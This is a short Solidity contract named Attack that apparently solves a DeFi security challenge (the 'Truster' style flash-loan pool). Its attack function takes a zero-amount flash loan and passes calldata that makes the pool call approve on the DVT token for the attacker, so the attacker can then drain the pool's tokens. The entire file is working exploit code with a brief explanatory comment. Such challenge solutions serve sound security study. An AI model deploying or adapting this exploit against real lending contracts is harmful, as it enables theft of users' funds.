// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface IDVT {
    function transfer(address recipient, uint256 amount) external returns (bool);
}

interface IPool {
    function flashLoan(
        uint256 borrowAmount,
        address borrower,
        address target,
        bytes calldata data
    )
        external;
}

contract Attack {
    IDVT dvt;
    IPool pool;

    constructor (IDVT _dvt, IPool _pool) {
        dvt = _dvt;
        pool = _pool;
    }

    function attack(address _attacker, uint256 _amount) external {
        // We can make Pool contract call any functio of any contract. SO, we will make it call approve function of token contract
        bytes memory payload = abi.encodeWithSignature("approve(address,uint256)",_attacker,_amount);
        pool.flashLoan(0, address(this), address(dvt), payload);
    }


}